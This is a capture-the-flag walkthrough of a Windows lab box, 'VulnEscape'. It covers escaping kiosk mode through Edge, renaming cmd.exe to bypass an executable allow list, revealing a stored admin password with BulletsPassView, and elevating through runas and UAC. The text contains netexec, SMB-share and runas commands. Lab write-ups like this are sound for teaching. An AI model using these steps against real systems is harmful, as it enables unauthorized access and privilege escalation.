VulnEscape starts with only one open TCP port, remote desktop. I’ll connect and find a kiosk account that doesn’t require a password. On logging in, I’m presented with a full screen image and not much else. I’ll escape kiosk mode by opening Edge, and using it to access the file system. There I’ll download cmd.exe to the downloads directory, and rename it to msedge.exe to bypass named-based allow lists. With a shell, I’ll find a Remote Desktop Plus session file. I’ll load it into the application, and use BulletPassView to see the password under the obfuscated dots. With an admin password, I’ll use runas to get a shell, but it’s limited by UAC, which I’ll bypass to get full admin access. And for an interesting twist, the entire box is in Korean. In Beyond Root, I’ll set the language back to English and explore the Kiosk mode settings.

### Initial Scanning

`nmap` finds a single open TCP port, RDP (3389):

```

This is clearly a Windows but, but there’s no evidence of [Active Directory](about:/cheatsheets/os#windows-domain-controller) at this point.

### RDP - TCP 3389

The only open port is remote desktop (RDP), which typically requires credentials. I’ll connect with `xfreerdp /v:10.129.234.51 /dynamic-resolution +clipboard -sec-nla`, and the resulting window shows a Windows PC in Kiosk mode:

![image-20250706160308341](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706160308341.webp)

The note says to login as KioskUser0 with no password. I can verify these creds with `netexec`:

```
oxdf@hacky$ netexec rdp 10.129.234.51 -u KioskUser0 -p ''
RDP         10.129.234.51   3389   ESCAPE           [*] Windows 10 or Windows Server 2016 Build 19041 (name:ESCAPE) (domain:Escape) (nla:False)
RDP         10.129.234.51   3389   ESCAPE           [+] Escape\KioskUser0: (Pwn3d!)
```

Clicking the button over RDP opens a login screen, where I’ll use those creds:

![image-20250706160501231](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706160501231.webp)

It works, and loads an image:

![image-20250706160930740](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706160930740.webp)

This is likely some kind of [Kiosk mode](https://learn.microsoft.com/en-us/deployedge/microsoft-edge-configure-kiosk-mode) where it is showing full screen this image or website.

## Kiosk Escape

### Launch Edge

Clicking around doesn’t seem to have any impact on the system. However, when I push the Windows key, it pops the start menu:

![image-20250706161504666](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706161504666.webp)

If I search for “cmd”, it does load, but clicking it doesn’t do anything:

![image-20250706164406181](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706164406181.webp)

PowerShell behaves the same way.

I’ll type “edge”, and it brings up Edge:

![image-20250706161535084](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706161535084.webp)

There are some configuration pages in a language I don’t speak, but after clicking around to get through them, I’ve got a full Edge page:

![image-20250706161618069](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706161618069.webp)

### Access Filesystem

I’ll enter “C:” as the URL, and it loads a file browser:

![image-20250706161702354](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706161702354.webp)

I’ll find `user.txt` on the KioskUser0 user’s desktop:

![image-20250706161841708](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706161841708.webp)

### Shell

#### Download cmd.exe

I’ll head into `C:\Windows\System32` and find `cmd.exe`. Clicking on it, it is downloaded to this user’s Downloads folder:

![image-20250706171150989](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706171150989.webp)

Clicking the folder icon opens File Explorer:

![image-20250706171219186](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706171219186.webp)

#### Run cmd.exe

Double-clicking this pops an error:

![image-20250706171259322](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706171259322.webp)

If I give that image to an AI (in this case Perplexity), it translates for me:

![image-20250706171409146](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706171409146.webp)

The restricted files could be identified many ways. One way would be by name. I’ll rename the binary from `cmd.exe` to `0xdf.exe`, but the same issue:

![image-20250706171501949](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706171501949.webp)

This suggests that the block is an allow list, rather than a block list. I know that Edge is allowed to run, so I’ll try renaming the binary to `msedge.exe`, and it opens!

![image-20250706171558756](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706171558756.webp)

I can run `powershell` to switch to PowerShell as well:

![image-20250706171644949](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706171644949.webp)

## Shell as admin

### Enumeration

#### Home Directories

There’s not much interesting in the KioskUser0 user’s home directory:

```
PS C:\Users\kioskUser0> tree /f .
Folder PATH listing
Volume serial number is 00000040 4A4B:52B4
C:\USERS\KIOSKUSER0

├───Music
├───Pictures

│   └───Saved Pictures
├───Saved Games
├───Searches
└───Videos
```

There’s nothing else of interest that’s accessible in `C:\Users`.

#### Filesystem Root

At the root of C:, it shows only very standard folders:

```
PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----

d-----         6/24/2025   1:24 PM                Windows
```

However, I’ll recall from browsing this with Edge there were more directories. I’ll look for hidden folders:

```
PS C:\> ls -force

    Directory: C:\

-a-hs-          7/6/2025  12:56 PM       16777216 swapfile.sys
```

Most of this is typical stuff, but `_admin` is interesting.

```
PS C:\_admin> ls

    Directory: C:\_admin

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----

-a----          2/3/2024   3:04 AM            574 profiles.xml
```

The `installers` and `passwords` directories are both empty. `profiles.xml` has a information about a user named admin:

```xml
<?xml version="1.0" encoding="utf-16"?>
<!-- Remote Desktop Plus -->
<Data>
  <Profile>
    <ProfileName>admin</ProfileName>
    <UserName>127.0.0.1</UserName>
    <Password>JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=</Password>
    <Secure>False</Secure>
  </Profile>
</Data>
```

This file is meant to be used with [Remote Desktop Plus](https://www.donkz.nl/).

There is an admin user on this machine:

```
PS C:\> net user

User accounts for \\ESCAPE

-------------------------------------------------------------------------------
admin                    Administrator            DefaultAccount
Guest                    kioskUser0               WDAGUtilityAccount
The command completed successfully.
```

#### Remote Desktop Plus

There isn’t too much of interest installed in `C:\Program Files` or `C:\Program Files (x86)`. The one thing that jumps out is Remote Desktop Plus:

```
PS C:\Program Files (x86)> ls

    Directory: C:\Program Files (x86)

d-----         12/7/2019   1:31 AM                WindowsPowerShell
```

I’ll run it:

```
PS C:\Program Files (x86)\Remote Desktop Plus> .\rdp.exe
```

The program opens:

![image-20250706173758359](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706173758359.webp)

### Recover Admin Password

#### Load Profile

Clicking on “Manage Profiles…” opens a view for profiles:

![image-20250706174133803](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706174133803.webp)

I’ll try to import a profile:

![image-20250706174150933](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706174150933.webp)

Unfortunately, the explorer that opens to pick the file won’t go back to the root of C:. From PowerShell, I’ll copy it to the Downloads directory:

```
PS C:\> copy C:\_admin\profiles.xml C:\Users\kioskUser0\Downloads\
```

Now I can open it for import:

![image-20250706174302897](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706174302897.webp)

And it shows up as a profile:

![image-20250706174322238](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706174322238.webp)

#### View Obfuscated Password

Unfortunately for me, the password is obfuscated by bullets. Double-clicking to edit the profile shows the same:

![image-20250706174732982](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706174732982.webp)

If I try to copy the password, it pops another error in Korean:

![image-20250706174800369](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706174800369.webp)

It is not allowed to copy form the password field:

![image-20250706174838122](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706174838122.webp)

#### BulletsPassView

There’s a utility named [BulletsPassView](https://www.nirsoft.net/utils/bullets_password_view.html) from NirSoft that will show what characters are hidden behind bullets on a Windows system.

I’ll download it from the website and unzip the result, giving `BulletsPassView.exe`. I’ll start a SMB server on my host:

```
oxdf@hacky$ smbserver.py share $(pwd) -smb2support -username oxdf -password oxdf
/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.

On VulnEscape, I’ll mount the share, copy the file over, and run it:

```
PS C:\> net use \\10.10.14.79\share /u:oxdf oxdf
The command completed successfully.

PS C:\> copy \\10.10.14.79\share\BulletsPassView.exe C:\Users\kioskUser0\Downloads\

PS C:\> C:\Users\kioskUser0\Downloads\BulletsPassView.exe
```

It opens up, detects the running windows, and shows the password:

![image-20250706175736394](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250706175736394.webp)

### Low Priv Shell

#### RDP Fail

I can try to log in with RDP with the new creds, but it doesn’t work:

![image-20250707065922766](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250707065922766.webp)

Perplexity translates that to:

> To log in remotely, you must have permission to log in through Remote Desktop Services. By default, members of the Remote Desktop Users group have this permission. If the group you currently belong to does not have this permission, or if this permission has been removed from the Remote Desktop Users group, you must be granted this permission manually.

This is surprising as admin is in the Administrators group:

```
PS C:\> net user admin

```

VulnEscape must be configured to not allow with only Administrators group.

#### Runas

Regardless, I can still use `runas` to run a new command as admin:

```
PS C:\> runas /user:admin powershell
Enter the password for admin:
Attempting to start powershell as user "ESCAPE\admin" ...
```

A new window opens:

This shell is missing the full Administrator privileges:

```
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled

SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

It must be UAC that’s blocking.

### UAC Bypass

With GUI access, a quick way to bypass UAC is to run `start-process powershell.exe -verb runas`. This pops the interactive UAC dialog:

I’ll click yes and a blue PowerShell window opens:

## Beyond Root

### Language Settings

As KioskUser0, in addition to Edge, I’m also able to open the Settings Window:

![image-20250707160017084](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250707160017084.webp)

If I search for “language”, there are several options:

![image-20250707160107843](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250707160107843.webp)

The top option loads the language settings:

![image-20250707160135761](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250707160135761.webp)

Setting it to English pops an error that say I must logout and back on again:

![image-20250707160157634](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250707160157634.webp)

In a terminal, I’ll run `logoff`, and then reconnect with RDP. There is still some Korean, but a lot of stuff is in English now. For example, the settings application in the start menu:

![image-20250707160507968](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250707160507968.webp)

And the settings:

![image-20250707160528549](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250707160528549.webp)

### Kiosk Mode

In settings, I’ll search for Kiosk, but there’s nothing there:

![image-20250707160612106](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250707160612106.webp)

This is because KioskUser0 has no permissions to access this setting. From my privileged shell, I’ll add the KioskUser0 user to the Administrators group:

```
PS C:\> net localgroup administrators /add KioskUser0
The command completed successfully.
```

I’ll run `logoff` again, and reconnect RDP. Back in Settings, now there’s a Kiosk panel:

![image-20250707160942635](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250707160942635.webp)

It is setup to run Edge as the Kiosk user:

![image-20250707161049809](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250707161049809.webp)

The user shows Kiosk because that is the user’s full name:

```
C:\Users\kioskUser0\Downloads>net user kioskuser0
User name                    kioskUser0

It loads the website on localhost as a full screen application. This is what sets it so only `msedge.exe` can run under this user.
